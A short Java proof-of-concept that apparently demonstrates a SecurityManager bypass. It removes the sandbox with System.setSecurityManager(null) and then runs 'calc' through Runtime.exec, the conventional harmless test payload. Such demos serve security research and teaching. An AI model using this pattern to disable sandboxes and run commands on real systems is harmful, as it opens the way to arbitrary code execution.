package com.SugarP1g.securityManager;

public class BySetSecurityManager {
    public static void main(String[] args) throws Exception {
        System.setSecurityManager(null);
        Runtime.getRuntime().exec("calc");
    }
}
